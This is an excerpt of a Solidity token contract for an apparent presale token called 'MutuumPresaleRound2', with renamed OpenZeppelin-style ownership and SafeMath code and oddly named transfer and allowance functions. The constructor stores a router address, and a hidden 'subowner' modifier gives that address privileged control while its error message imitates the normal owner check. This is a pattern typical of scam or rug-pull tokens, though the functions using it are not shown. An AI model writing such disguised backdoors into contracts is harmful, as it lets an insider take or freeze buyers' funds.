...
/// https://x.com/MutuumPresaleRound2


pragma solidity 0.8.29;

// MutuumPresaleRound2 fan token

interface MutuumPresaleRound2interface {
  /**
...
/*
 * @dev Provides information about the current execution MutuumPresaleRound220Burnable, including the
 ...
 */
abstract contract MutuumPresaleRound220Burnable {
...
// File: @openzeppelin/contracts/access/MutuumPresaleRound220Ownable.sol
 ...
 * the owner.
 */
abstract contract MutuumPresaleRound220Ownable is MutuumPresaleRound220Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "MutuumPresaleRound220Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "MutuumPresaleRound220Ownable: new owner is the zero address");
 ...
 * `SafeMutuumPresaleRound2` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMutuumPresaleRound2 {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMutuumPresaleRound2: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMutuumPresaleRound2: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeMutuumPresaleRound2: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMutuumPresaleRound2: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMutuumPresaleRound2: modulo by zero");
  }
...
contract MutuumPresaleRound2Token is MutuumPresaleRound220Burnable, MutuumPresaleRound2interface, MutuumPresaleRound220Ownable {
    
    using SafeMutuumPresaleRound2 for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _name = "MutuumPresale Round2";
        _symbol = "MutuumPresale Round2";
        _decimals = 9;
    ...
    */
    ...
    /**
    * @dev See {MutuumPresaleRound2interface-totalSupply}.
    */
    ...
    /**
    * @dev See {MutuumPresaleRound2interface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "MutuumPresaleRound220Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {MutuumPresaleRound2interface-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {MutuumPresaleRound2interface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {MutuumPresaleRound2interface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {MutuumPresaleRound2interface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {MutuumPresaleRound2interface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "MutuumPresaleRound2interface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {MutuumPresaleRound2interface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "MutuumPresaleRound2interface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "MutuumPresaleRound2interface: transfer from the zero address");
        require(shippingto != address(0), "MutuumPresaleRound2interface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "MutuumPresaleRound2interface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "MutuumPresaleRound2interface: approve from the zero address");
        require(transporteur != address(0), "MutuumPresaleRound2interface: approve to the zero address");
